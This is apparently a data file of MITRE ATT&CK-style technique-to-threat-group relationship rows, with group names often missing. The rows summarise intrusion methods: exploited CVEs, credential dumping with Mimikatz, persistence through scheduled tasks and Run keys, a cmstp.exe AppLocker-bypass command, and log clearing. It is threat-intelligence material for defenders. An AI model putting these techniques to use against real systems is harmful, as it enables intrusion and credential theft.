Scheduled Task,has used  to register a scheduled task to execute malware during lateral movement.,relationship
Visual Basic,has used VBS and VBE scripts for execution.,relationship
Taint Shared Content,has placed malware on file shares and given it the same name as legitimate documents on the share.,relationship
Right-to-Left Override,has used Right-to-Left Override to deceive victims into executing several strains of malware.,relationship
Python,has made use of Python-based remote access tools.,relationship
Masquerading,has masked executables with document file icons including Word and Adobe PDF.,relationship
Software Discovery,has used tools to enumerate software installed on an infected host.,relationship
Steganography,has used steganography in multiple operations to conceal malicious payloads.,relationship
Disable or Modify Tools,has incorporated code into several tools that attempts to terminate anti-virus processes.,relationship
System Service Discovery,has used TROJ_GETVERSION to discover system services.,relationship
DLL Side-Loading,has used legitimate applications to side-load malicious DLLs.,relationship
Exploit Public-Facing Application,has exploited a buffer overflow vulnerability in Microsoft Internet Information Services (IIS) 6.0 CVE-2017-7269 in order to establish a new HTTP or command and control (C2) server.,relationship
Exploitation for Client Execution,has exploited multiple vulnerabilities for execution including Microsoft Office vulnerabilities CVE-2012-0158 CVE-2014-6352 CVE-2017-0199 and Adobe Flash CVE-2015-5119.,relationship
Right-to-Left Override,has used right-to-left-override to obfuscate the filenames of malicious e-mail attachments.,relationship
Malicious Link,has used e-mails with malicious links to lure victims into installing malware. ,relationship
Spearphishing Link,has used spearphishing e-mails with links to cloud services to deliver malware.,relationship
Spearphishing Attachment,has used spearphishing e-mails with malicious documents to deliver malware.,relationship
Malicious File,has used e-mails with malicious documents to lure victims into installing malware. ,relationship
Service Execution,has executed custom-compiled XMRIG miner DLLs by configuring them to execute via the wercplsupport service.,relationship
Regsvr32,has executed custom-compiled XMRIG miner DLLs using regsvr32.exe.,relationship
Rundll32,has executed custom-compiled XMRIG miner DLLs using rundll32.exe.,relationship
Exploit Public-Facing Application,has gained initial access by exploiting CVE-2019-18935 a vulnerability within Telerik UI for ASP.NET AJAX.,relationship
Scheduled Task,has used Windows Scheduled Tasks to establish persistence on local and remote hosts.,relationship
Windows Command Shell,has used batch script files to automate execution and deployment of payloads.,relationship
Windows Management Instrumentation Event Subscription,has used mofcomp.exe to establish WMI Event Subscription persistence mechanisms configured from a *.mof file.,relationship
Resource Hijacking,has used XMRIG to mine cryptocurrency on victim systems.,relationship
Proxy,has used frp ssf and Venom to establish SOCKS proxy connections.,relationship
PowerShell,has used PowerShell reverse TCP shells to issue interactive commands over a network connection.,relationship
SMB/Windows Admin Shares,has used Windows Explorer to manually copy malicious files to remote hosts over SMB.,relationship
Remote Desktop Protocol,has used Remote Desktop to log on to servers interactively and manually copy files to remote hosts.,relationship
LSASS Memory,has used Mimikatz to retrieve credentials from LSASS memory.,relationship
Access Token Manipulation,has used JuicyPotato to abuse the SeImpersonate token privilege to escalate from web application pool accounts to NT Authority\SYSTEM.,relationship
Match Legitimate Name or Location,has masqueraded their XMRIG payload name by naming it wercplsupporte.dll after the legitimate wercplsupport.dll file.,relationship
Windows Service,has made their XMRIG payloads persistent as a Windows Service.,relationship
System Information Discovery,has collected hardware details for the victim's system including CPU and memory information.,relationship
Modify Registry,has used Windows Registry modifications to specify a DLL payload.,relationship
Windows Management Instrumentation,has used wmic.exe to set environment variables.,relationship
Obfuscated Files or Information,has obfuscated the wallet address in the payload binary.,relationship
COR_PROFILER,has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR.,relationship
Match Legitimate Name or Location,has named malware svchost.exe which is the name of the Windows shared service host program.,relationship
Valid Accounts,actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.,relationship
Windows Service,malware installs itself as a service to provide persistence and SYSTEM privileges.,relationship
Bidirectional Communication,has used a VBScript named ggldr that uses Google Apps Script Sheets and Forms services for C2.,relationship
Rundll32,installs VNC server software that executes through rundll32.,relationship
Disable or Modify System Firewall,may use  to add local firewall rule exceptions.,relationship
Remote Access Software,used legitimate programs such as AmmyyAdmin and Team Viewer for remote interactive C2 to target systems.,relationship
Masquerade Task or Service,has copied legitimate service names to use for malicious services.,relationship
Remote Desktop Protocol,has used RDP to access targeted systems.,relationship
Archive via Utility,has used modified RAR software to archive data with a password.,relationship
Web Service,has used Google Cloud's appspot service to host C2 servers.,relationship
Ingress Tool Transfer,has remotely copied tools and malware onto targeted systems.,relationship
Valid Accounts,has used a valid account to maintain persistence via scheduled task.,relationship
Windows Management Instrumentation,has used WMIC to execute remote commands.,relationship
Domain Account,has has used net user /dom to enumerate domain accounts.,relationship
NTDS,has gathered the SYSTEM registry and ntds.dit files from target systems.,relationship
Match Legitimate Name or Location,has renamed malware to GoogleUpdate.exe impersonating legitimate Google filenames.,relationship
Domain Controller Authentication,malware has altered the NTLM authentication program on domain controllers to allow  to login without a valid credential.,relationship
Obfuscated Files or Information,has encoded PowerShell commands.,relationship
PowerShell,has used PowerShell scripts to execute malicious payloads.,relationship
Scheduled Task,has used scheduled tasks to invoke Cobalt Strike and maintain persistence.,relationship
External Remote Services,has used legitimate credentials to login to an external VPN.,relationship
Native API,has used direct Windows system calls by leveraging Dumpert.,relationship
SMB/Windows Admin Shares,has used Windows admin shares to move laterally.,relationship
LSASS Memory,has been known to dump credentials using Mimikatz and Windows Credential Editor.,relationship
Social Media Accounts,has created fake LinkedIn profiles that included profile photos details and connections.,relationship
Malware,has created customized tools and payloads for functions including ARP poisoning encryption credential dumping ASP.NET shells web backdoors process enumeration WMI querying HTTP and SMB communications network interface sniffing and keystroke logging.,relationship
ARP Cache Poisoning,has used custom tools to facilitate ARP cache poisoning.,relationship
Remote Desktop Protocol,has used Remote Desktop Protocol to conduct lateral movement.,relationship
CMSTP,has used the command cmstp.exe /s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt to bypass AppLocker and launch a malicious script.,relationship
Web Protocols,has used HTTPS for C2.,relationship
Scheduled Task,has created Windows tasks to establish persistence.,relationship
Malicious File,has sent emails containing malicious attachments that require users to execute a file or macro to infect the victim machine.,relationship
Spearphishing Link,has sent emails with URLs pointing to malicious documents.,relationship
Network Service Scanning,leveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning.,relationship
Windows Service,has created new services to establish persistence.,relationship
Ingress Tool Transfer,has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers. The group's JavaScript backdoor is also capable of downloading files.,relationship
Bypass User Account Control,has bypassed UAC.,relationship
Obfuscated Files or Information,obfuscated several scriptlets and code used on the victims machine including through use of XOR and RC4.,relationship
Exploitation for Privilege Escalation,has used exploits to increase their levels of rights and privileges.,relationship
Spearphishing Attachment,has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations. Attachment types have included .rtf .doc .xls archives containing LNK files and password protected archives containing .exe and .scr executables.,relationship
Process Injection,has injected code into trusted processes.,relationship
Regsvr32,has used regsvr32.exe to execute scripts.,relationship
File Deletion,deleted the DLL dropper from the victims machine to cover their tracks.,relationship
Dynamic Data Exchange,has sent malicious Word OLE compound documents to victims.,relationship
Remote Access Software,used the Ammyy Admin tool as well as TeamViewer for remote access including to preserve remote access if a Cobalt Strike module was lost.,relationship
Registry Run Keys / Startup Folder,has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.,relationship
Exploitation for Client Execution,had exploited multiple vulnerabilities for execution including Microsofts Equation Editor (CVE-2017-11882) an Internet Explorer vulnerability (CVE-2018-8174) CVE-2017-8570 CVE-2017-0199 and CVE-2017-8759.,relationship
Logon Script (Windows),has added persistence by registering the file name for the next stage malware under HKCU\Environment\UserInitMprLogonScript.,relationship
Asymmetric Cryptography,has used the Plink utility to create SSH tunnels.,relationship
Security Software Discovery,used a JavaScript backdoor that is capable of collecting a list of the security solutions installed on the victim's machine.,relationship
Visual Basic,has sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution.,relationship
XSL Script Processing,used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.,relationship
PowerShell,has used powershell.exe to download and execute scripts.,relationship
Odbcconf,has used odbcconf to proxy the execution of malicious DLL files.,relationship
Protocol Tunneling,has used the Plink utility to create SSH tunnels.,relationship
DNS,has used DNS tunneling for C2.,relationship
Malicious Link,has sent emails containing malicious links that require users to execute a file or macro to infect the victim machine.,relationship
Windows Command Shell,has used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands. The group has used an exploit toolkit known as Threadkit that launches .bat files.,relationship
JavaScript/JScript,has executed JavaScript scriptlets on the victim's machine.,relationship
Rundll32,uses rundll32 to load various tools on victims including a lateral movement tool named Vminst Cobalt Strike and shellcode.,relationship
Archive via Utility,uses ZPP a .NET console program to compress files with ZIP.,relationship
PowerShell,has used PowerShell Empire.,relationship
Archive via Custom Method,encrypts data with a substitute cipher prior to exfiltration.,relationship
Code Signing,digitally signed an executable with a stolen certificate from legitimate company AI Squared.,relationship
Hidden Window,has used -w hidden and -windowstyle hidden to conceal  windows. ,relationship
Windows Command Shell,has used macros in Word documents that would download a second stage if executed.,relationship
Malicious File,makes their malware look like Flash Player Office or PDF documents in order to entice a user to click on it.,relationship
Spearphishing via Service,spearphished victims via Facebook and Whatsapp.,relationship
Data from Local System,collected complete contents of the 'Pictures' folder from compromised Windows systems.,relationship
File and Directory Discovery,collected file listings of all default Windows directories.,relationship
Drive-by Compromise,leveraged a watering hole to serve up malicious code.,relationship
Compiled HTML File,leveraged a compiled HTML file that contained a command to download and run an executable.,relationship
Registry Run Keys / Startup Folder,version of  adds a registry key to HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run for persistence.,relationship
Screen Capture,took screenshots using their Windows malware.,relationship
Software Packing,has used UPX to pack .,relationship
Web Protocols,version of  communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string &&&.,relationship
Obfuscated Files or Information,has obfuscated strings in  by base64 encoding and then encrypting them.,relationship
Forced Authentication,used  to launch an authentication window for users to enter their credentials.,relationship
Spearphishing Attachment,has sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the attachedTemplate technique to load a template from a remote server.,relationship
Template Injection,used an open-source tool Phishery to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable .,relationship
Malicious File,has sent malware that required users to hit the enable button in Microsoft Excel to allow an .iqy file to be downloaded.,relationship
PowerShell,leveraged PowerShell to download and execute additional scripts for execution.,relationship
Hidden Window,has used -WindowStyle Hidden to conceal  windows. ,relationship
Hardware Additions,used Bash Bunny Raspberry Pi netbooks or inexpensive laptops to connect to the companys local network.,relationship
Network Share Discovery,scanned the network for public shared folders.,relationship
Non-Standard Port,used ports 5190 and 7900 for shellcode listeners and 4444 4445 31337 for shellcode C2.,relationship
Windows Service,created new services for shellcode loaders distribution.,relationship
PowerShell,used PowerShell to create shellcode loaders.,relationship
Remote Access Software,used DameWare Mini Remote Control for lateral movement.,relationship
Network Sniffing,used network sniffing to obtain login data. ,relationship
Brute Force,used brute-force attack to obtain login data.,relationship
Network Service Scanning,performed port scanning to obtain the list of active services.,relationship
Regsvr32,has used regsvr32.exe to execute a server variant of  in victim networks.,relationship
Windows Management Instrumentation,The  group is known to utilize WMI for lateral movement.,relationship
Indicator Removal from Tools,has updated and modified its malware resulting in different hash values that evade detection.,relationship
SMB/Windows Admin Shares,uses net.exe to connect to network shares using net use commands with compromised credentials.,relationship
Remote System Discovery,has used ping to identify other machines of interest.,relationship
Process Discovery,uses the Microsoft  utility to list processes running on systems.,relationship
Accessibility Features,has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions.,relationship
PowerShell,has used PowerShell scripts to download and execute programs in memory without writing to disk.,relationship
Web Shell,uses Web shells on publicly accessible Web servers to access victim networks.,relationship
Hidden Window,has used -w hidden to conceal  windows by setting the WindowStyle parameter to hidden. ,relationship
Phishing,has used spearphising campaigns to gain access to victims.,relationship
Compromise Software Supply Chain,has placed trojanized installers on legitimate vendor app stores.,relationship
Drive-by Compromise,has has compromised targets via strategic web compromise (SWC) utilizing a custom exploit kit.,relationship
Masquerading,created accounts disguised as legitimate backup and service accounts as well as an email administration account.,relationship
Domain Groups,used batch scripts to enumerate administrators and users in the domain.,relationship
Malicious File,has used various forms of spearphishing in attempts to get users to open attachments.,relationship
Command and Scripting Interpreter,used command line for execution.,relationship
Application Layer Protocol,used SMB for C2.,relationship
Local Account,created accounts on victims including administrator accounts some of which appeared to be tailored to each individual staging target.,relationship
Disable or Modify System Firewall,has disabled host-based firewalls. The group has also globally opened port 3389.,relationship
Modify Registry,modified the Registry to perform multiple techniques through the use of .,relationship
Template Injection,has injected SMB URLs into malicious Word spearphishing attachments to initiate .,relationship
Remote Email Collection,accessed email accounts using Outlook Web Access.,relationship
Drive-by Compromise,compromised legitimate organizations' websites to create watering holes to compromise victims.,relationship
Security Account Manager,dropped and executed SecretsDump to dump password hashes.,relationship
Remote System Discovery,likely obtained a list of hosts in the victim environment.,relationship
Clear Windows Event Logs,cleared Windows event logs and other logs produced by tools they used including system security terminal services remote services and audit logs. The actors also deleted specific Registry keys.,relationship
Scheduled Task,used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.,relationship
File and Directory Discovery,used a batch script to gather folder and file names from victim hosts.,relationship
Network Share Discovery,identified and browsed file servers in the victim network sometimes viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.,relationship
Valid Accounts,compromised user credentials and used valid accounts for operations.,relationship
Data from Local System,collected data from local victim systems.,relationship
Query Registry,queried the Registry to identify victim information.,relationship
Forced Authentication,has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.,relationship
Windows Command Shell,used various types of scripting to perform operations including batch scripts.,relationship
Screen Capture,has performed screen captures of victims including by using a tool scr.exe (which matched the hash of ScreenUtil).,relationship
System Network Configuration Discovery,used batch scripts to enumerate network information including information about trusts zones and the domain.,relationship
File Deletion,deleted many of its files used during operations as part of cleanup including removing applications and deleting screenshots.,relationship
Ingress Tool Transfer,copied and installed tools for operations once in the victim environment.,relationship
Shortcut Modification,manipulated .lnk files to gather user credentials in conjunction with .,relationship
Web Shell,commonly created Web shells on victims' publicly accessible email and web servers which they used to maintain access to a victim network and download additional malicious files.,relationship
Spearphishing Attachment,used spearphishing with Microsoft Office attachments to target victims.,relationship
Password Cracking,dropped and executed tools used for password cracking including Hydra and .,relationship
Spearphishing Link,used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites.,relationship
External Remote Services,used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.,relationship
Registry Run Keys / Startup Folder,added the registry value ntdll to the Registry Run key to establish persistence.,relationship
Remote Desktop Protocol,moved laterally via RDP.,relationship
PowerShell,used PowerShell scripts for execution.,relationship
System Owner/User Discovery,used the command query user on victim hosts.,relationship
Local Data Staging,created a directory named out in the user's %AppData% folder and copied files to it.,relationship
Account Manipulation,added newly created accounts to the administrators group to maintain elevated access.,relationship
Commonly Used Port,used SMB over ports 445 or 139 for C2. The group also established encrypted connections over port 443.,relationship
Domain Account,used batch scripts to enumerate users on a victim domain controller.,relationship
Archive Collected Data,compressed data into .zip files prior to exfiltrating it.,relationship
Malicious Link,has used various forms of spearphishing in attempts to get users to open links.,relationship
Python,used various types of scripting to perform operations including Python scripts. The group was observed installing Python 2.7 on a victim.,relationship
NTDS,dropped and executed SecretsDump to dump password hashes. They also obtained ntds.dit from domain controllers. ,relationship
LSA Secrets,dropped and executed SecretsDump to dump password hashes.,relationship
Obfuscated Files or Information,has encoded payloads with a single-byte XOR both skipping the key itself and zeroing in an attempt to avoid exposing the key.,relationship
Data from Local System,has used Android backdoors capable of exfiltrating specific files directly from the infected devices.,relationship
File and Directory Discovery,has used Android backdoors capable of enumerating specific files on the infected devices.,relationship
Software Packing,has packed malware payloads before delivery to victims.,relationship
Supply Chain Compromise,has targeted manufacturers in the supply chain for the defense industry.,relationship
Drive-by Compromise,has delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector.,relationship
Spearphishing Link,has delivered zero-day exploits and malware to victims via targeted emails containing a link to malicious content hosted on an uncommon Web server.,relationship
Obfuscated Files or Information,has encrypted documents and malicious executables.,relationship
Exploitation for Client Execution,has used exploitation of endpoint software including Microsoft Internet Explorer Adobe Flash vulnerabilities to gain execution. They have also used zero-day exploits.,relationship
Spearphishing Attachment,has delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments.,relationship
Malicious File,has leveraged multiple types of spearphishing in order to attempt to get a user to open attachments.,relationship
Ingress Tool Transfer,The Ritsol backdoor trojan used by  can download files onto a compromised host from a remote location.,relationship
Malicious Link,has leveraged multiple types of spearphishing in order to attempt to get a user to open links.,relationship
PowerShell,uses PowerShell for execution as well as PowerShell Empire to establish persistence.,relationship
Windows Command Shell,has executed malicious .bat files containing PowerShell commands.,relationship
File Deletion,has used batch scripts and scheduled tasks to delete critical system files.,relationship
System Owner/User Discovery,has used Meterpreter to enumerate users on remote systems.,relationship
Registry Run Keys / Startup Folder,has established persistence by using the Registry option in PowerShell Empire to add a Run key.,relationship
Scheduled Task,has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire.,relationship
Valid Accounts,has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor.,relationship
Remote Desktop Protocol,has used RDP to move laterally to systems in the victim environment.,relationship
Lateral Tool Transfer,has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.,relationship
Local Accounts,has moved laterally using the Local Administrator account.,relationship
External Proxy,maintains access to victim environments by using  to create a proxy for a backup RDP tunnel.,relationship
File Deletion,uses  to clean up the environment and attempt to prevent detection.,relationship
Remote System Discovery,has used the open source tool Essential NetTools to map the network and build a list of targets.,relationship
Clear Windows Event Logs,has cleared event logs from victims.,relationship
Valid Accounts,has used legitimate VPN RDP Citrix or VNC credentials to maintain access to a victim environment.,relationship
Brute Force,has has used the tool GET5 Penetrator to look for remote login and hard-coded credentials.,relationship
Local Data Staging,scripts save memory dump data into a specific directory on hosts in the victim environment.,relationship
Command and Scripting Interpreter,scans processes on all victim systems in the environment and uses automated scripts to pull back the results.,relationship
External Remote Services,has used legitimate VPN Citrix or VNC credentials to maintain access to a victim environment.,relationship
Automated Collection,scans processes on all victim systems in the environment and uses automated scripts to pull back the results.,relationship
Domain Account,has used Metasploits  NTDSGRAB module to obtain a copy of the victim's Active Directory database.,relationship
Remote System Discovery,used publicly available tools (including Microsoft's built-in SQL querying tool osql.exe) to map the internal network and conduct reconnaissance against Active Directory Structured Query Language (SQL) servers and NetBIOS.,relationship
Scheduled Task,has used scheduled tasks to establish persistence for various malware it uses including downloaders known as HARDTACK and SHIPBREAD and .,relationship
Archive via Custom Method,has encoded data gathered from the victim with a simple substitution cipher and single-byte XOR using the 0xAA key and Base64 with character permutation.,relationship
Remote Desktop Protocol,used RDP to move laterally in victim networks.,relationship
Automated Collection,has used a script to iterate through a list of compromised PoS systems copy and remove data to a log file and to bind to events from the submit payment button.,relationship
Archive Collected Data,Following data collection  has compressed log files into a ZIP archive prior to staging and exfiltration.,relationship
Exploitation for Privilege Escalation,has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660 CVE-2011-2005 and CVE-2010-4398 all of which could allow local users to access kernel-level privileges.,relationship
PowerShell,has used PowerShell to gain access to merchant's networks and a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.,relationship
Network Service Scanning,used publicly available tools (including Microsoft's built-in SQL querying tool osql.exe) to map the internal network and conduct reconnaissance against Active Directory Structured Query Language (SQL) servers and NetBIOS.,relationship
Command and Scripting Interpreter,has used scripting to iterate through a list of compromised PoS systems copy data to a log file and remove the original data files.,relationship
Registry Run Keys / Startup Folder,has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD.,relationship
Valid Accounts,To move laterally on a victim network  has used credentials stolen from various systems on which it gathered usernames and password hashes.,relationship
LSASS Memory,has used  for credential dumping.,relationship
Protocol Tunneling,used the Plink command-line utility to create SSH tunnels to C2 servers.,relationship
Asymmetric Cryptography,used the Plink command-line utility to create SSH tunnels to C2 servers.,relationship
Masquerade Task or Service,has renamed the psexec service name to mstdc to masquerade as a legitimate Windows service.,relationship
Web Service,has used Pastebin and Google Storage to host content for their operations.,relationship
Domain Groups,has used tools like Adfind to query users groups organizational units and trusts.,relationship
Service Execution,has created Windows services to execute encoded PowerShell commands.,relationship
Code Signing,has used Comodo code-signing certificates.,relationship
Windows Management Instrumentation,has used WMI to automate the remote execution of PowerShell scripts.,relationship
Spearphishing via Service,has used fake job advertisements sent via LinkedIn to spearphish targets.,relationship
Remote Data Staging,actors have compressed data from remote systems and moved it to another staging system before exfiltration.,relationship
NTDS,has used Metasploits  NTDSGRAB module to obtain a copy of the victim's Active Directory database.,relationship
Password Cracking,has extracted password hashes from ntds.dit to crack offline.,relationship
Access Token Manipulation,has used has used Metasploits named-pipe impersonation technique to escalate privileges.,relationship
Disable or Modify Tools,has deployed a utility script named kill.bat to disable anti-virus.,relationship
Data from Local System,has collected and exfiltrated payment card data from compromised systems.,relationship
Malicious File,has used malicious documents to lure victims into allowing execution of PowerShell scripts.,relationship
Spearphishing Attachment,has targeted victims with e-mails containing malicious attachments.,relationship
Credentials from Web Browsers,has used the Stealer One credential stealer to target web browsers.,relationship
Credentials from Password Stores,has used the Stealer One credential stealer to target e-mail and file transfer utilities including FTP.,relationship
Obfuscated Files or Information,has used encoded PowerShell commands.,relationship
File Deletion,has removed files from victim machines.,relationship
JavaScript/JScript,has used malicious JavaScript to steal payment card data from e-commerce sites.,relationship
Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,has sent stolen payment card data to remote servers via HTTP POSTs.,relationship
Data from Information Repositories,has collected schemas and user accounts from systems running SQL Server.,relationship
Non-Application Layer Protocol,has used Metasploit Bind and Reverse TCP stagers.,relationship
Windows Command Shell,has used kill.bat script to disable security tools.,relationship
Video Capture,created a custom video recording capability that could be used to monitor operations in the victim's environment.,relationship
Code Signing,has signed  payloads with legally purchased code signing certificates.  has also digitally signed their phishing documents backdoors and other staging tools to bypass security controls.,relationship
Masquerade Task or Service,has created a scheduled task named AdobeFlashSync to establish persistence.,relationship
Application Shimming,has used application shim databases for persistence.,relationship
Malicious File,lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file.,relationship
PowerShell,used a PowerShell script to launch shellcode that retrieved an additional payload.,relationship
DNS,has performed C2 using DNS via A OPT and TXT records.,relationship
Dynamic Data Exchange,spear phishing campaigns have included malicious Word documents with DDE execution.,relationship
Mshta,has used mshta.exe to execute VBScript to execute malicious code on victim systems.,relationship
Command and Scripting Interpreter,used SQL scripts to help perform tasks on the victim's machine.,relationship
Bidirectional Communication,used legitimate services like Google Docs Google Scripts and Pastebin for C2.,relationship
Spearphishing Attachment,sent spearphishing emails with either malicious Microsoft Documents or RTF files attached.,relationship
Windows Service,created new Windows services and added them to the startup directories for persistence.,relationship
Ingress Tool Transfer,has downloaded additional malware to execute on the victim's machine including by using a PowerShell script to launch shellcode that retrieves an additional payload.,relationship
Commonly Used Port,has used ports 53 80 443 and 8080 for C2.,relationship
Scheduled Task,malware has created scheduled tasks to establish persistence.,relationship
Obfuscated Files or Information,has used fragmented strings environment variables standard input (stdin) and native character-replacement functionalities to obfuscate commands.,relationship
Screen Capture,captured screenshots and desktop video recordings.,relationship
Registry Run Keys / Startup Folder,malware has created Registry Run and RunOnce keys to establish persistence and has also added items to the Startup folder.,relationship
User Activity Based Checks,used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes.,relationship
Windows Command Shell,used the command prompt to launch commands on the victims machine. ,relationship
Visual Basic,used VBS scripts to help perform tasks on the victim's machine.,relationship
Non-Standard Port,has used port-protocol mismatches on ports such as 53 80 443 and 8080 during C2.,relationship
JavaScript/JScript,used JavaScript scripts to help perform tasks on the victim's machine.,relationship
Malware,has developed malware for use in operations including the creation of infected removable media.,relationship
Obfuscated Files or Information,has used environment variables and standard input (stdin) to obfuscate command-line arguments.  also obfuscates malicious macros delivered as payloads.,relationship
Spearphishing Attachment,has distributed targeted emails containing Word documents with embedded malicious macros.,relationship
Commonly Used Port,has tunneled RDP backdoors over port 443.,relationship
Valid Accounts,has utilized  during and  and .,relationship
Archive via Utility,has used RAR to compress collected data before .,relationship
Ingress Tool Transfer,has used remote code execution to download subsequent payloads.,relationship
Malicious File,has leveraged Spearphishing Attachments attempting to gain User Execution.,relationship
Windows Command Shell,has used a Batch file to automate frequently executed post compromise cleanup activities.  executes commands remotely via cmd.exe.,relationship
Remote Desktop Protocol,has used RDP for .,relationship
File Deletion,has deleted tmp and prefetch files during post compromise cleanup activities.,relationship
Clear Windows Event Logs,has cleared logs during post compromise cleanup activities.,relationship
Windows Management Instrumentation,malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution.  has also used WMIC during and post compromise cleanup activities.,relationship
LSASS Memory,harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE).,relationship
Remote System Discovery,uses  and other Active Directory utilities to enumerate hosts.,relationship
Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,has used FTP to exfiltrate collected data.,relationship
Scheduled Task,has used scheduled tasks to maintain RDP backdoors.,relationship
Asymmetric Cryptography,has used the Plink utility to tunnel RDP back to C2 infrastructure.,relationship
SMB/Windows Admin Shares,has attempted to map to C$ on enumerated hosts to test the scope of their current credentials/context.,relationship
Exploitation for Privilege Escalation,has exploited the CVE-2016-0167 local vulnerability.,relationship
PowerShell,malicious spearphishing payloads are executed as .  has also used  during  and .,relationship
Remote Data Staging,aggregates staged data from a network into a single location.,relationship
Security Software Discovery,has used Registry keys to detect and avoid executing in potential sandboxes.,relationship
Modify Registry,has deleted Registry keys during post compromise cleanup activities.,relationship
Spearphishing Link,has distributed targeted emails containing links to malicious documents with embedded macros.,relationship
Malicious Link,has leveraged Spearphishing Links attempting to gain User Execution.,relationship
Spearphishing Attachment,has used spearphishing emails to send trojanized Microsoft Word documents. ,relationship
PowerShell,has used PowerShell to run a series of base64-encoded commands that acted as a stager and enumerated hosts.,relationship
Windows Command Shell,has run a command script to set up persistence as a scheduled task named WinUpdate as well as other encoded commands from the command-line.,relationship
Malicious File,has used trojanized Microsoft Word documents sent via email which prompted the victim to enable macros.,relationship
Exploitation for Client Execution,has used CVE-2017-11882 to execute code on the victim's machine.,relationship
Scheduled Task,has established persistence through a scheduled task using the command: /Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR named WinUpdate.,relationship
Template Injection,has used trojanized documents that retrieve remote templates from an adversary-controlled website.,relationship
Visual Basic,has used Word documents that prompts the victim to enable macros and run a Visual Basic script.,relationship
Obfuscated Files or Information,has run encoded commands from the command line.,relationship
MSBuild,has used MSbuild to execute an actor-created file.,relationship
Windows Management Instrumentation,has used WMI queries to check if various security applications were running as well as the operating system version.,relationship
System Checks,has used WMI queries to check if various security applications were running including VMWare and Virtualbox.,relationship
Security Software Discovery,has used WMI queries to detect if virtualization environments or analysis tools were running on the system.,relationship
OS Credential Dumping,has harvested credentials from the victim's machine using .,relationship
System Network Configuration Discovery,has enumerated hosts looking for the public IP address of the system.,relationship
Ingress Tool Transfer,has uploaded and downloaded files to utilize additional plugins.,relationship
Exfiltration Over C2 Channel,has collected information via  which is automatically sent the data back to the adversary's C2.,relationship
Automated Exfiltration,has collected information via  which is automatically sent the data back to the adversary's C2.,relationship
Process Discovery,has enumerated hosts looking to obtain a list of all currently running processes.,relationship
System Information Discovery,has enumerated hosts looking for the system's machine name.,relationship
Symmetric Cryptography,has communicated with a C2 via an encrypted RC4 byte stream and AES-CBC.,relationship
System Owner/User Discovery,has enumerated hosts gathering username machine name and administrative permissions information.,relationship
Data from Local System,has enumerated hosts via  gathering various local system information.,relationship
Automated Collection,has enumerated hosts via  gathering the username domain name machine name and other system information.,relationship
Deobfuscate/Decode Files or Information,has deobfuscated base64-encoded commands following the execution of a malicious script which revealed a small script designed to obtain an additional payload. ,relationship
External Remote Services,has used publicly-accessible RDP and remote management and monitoring (RMM) servers to gain access to victim machines.,relationship
Trusted Relationship,has breached Managed Service Providers (MSP's) to deliver malware to MSP customers.,relationship
Exploit Public-Facing Application,has exploited Oracle WebLogic vulnerabilities for initial compromise.,relationship
Phishing,has conducted malicious spam (malspam) campaigns to gain access to victim's machines.,relationship
Compromise Software Supply Chain,has distributed ransomware by backdooring software installers via a strategic web compromise of the site hosting Italian WinRAR.,relationship
Exfiltration Over C2 Channel,A  file stealer can transfer collected files to a hardcoded C2 server.,relationship
System Information Discovery,A  file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.,relationship
Web Protocols,A  file stealer can communicate over HTTP for C2.,relationship
Peripheral Device Discovery,tools have contained an application to check performance of USB flash drives.  has also used malware to scan for removable drives.,relationship
Ingress Tool Transfer,Tools used by  are capable of downloading and executing additional payloads.,relationship
System Owner/User Discovery,A  file stealer can gather the victim's username to send to a C2 server.,relationship
Data from Removable Media,A  file stealer has the capability to steal data from newly connected logical volumes on a system including USB drives.,relationship
Windows Command Shell,has used various batch scripts to establish C2 and download additional files. 's backdoor malware has also been written to a batch file.,relationship
File Deletion,tools can delete files used during an infection.,relationship
Registry Run Keys / Startup Folder,tools have registered Run keys in the registry to give malicious VBS files persistence.,relationship
Deobfuscate/Decode Files or Information,tools decrypted additional payloads from the C2.  has also decoded base64-encoded source code of a downloader.,relationship
Visual Basic,has embedded malicious macros in document templates which executed VBScript.  has also delivered Microsoft Outlook VBA projects with embedded macros.,relationship
Template Injection,has used DOCX files to download malicious DOT document templates.  can also inject malicious macros or remote templates into documents already present on compromised systems.,relationship
Malicious File,has attempted to get users to click on Office attachments with malicious macros embedded.,relationship
Spearphishing Attachment,has delivered spearphishing emails with malicious attachments to targets.,relationship
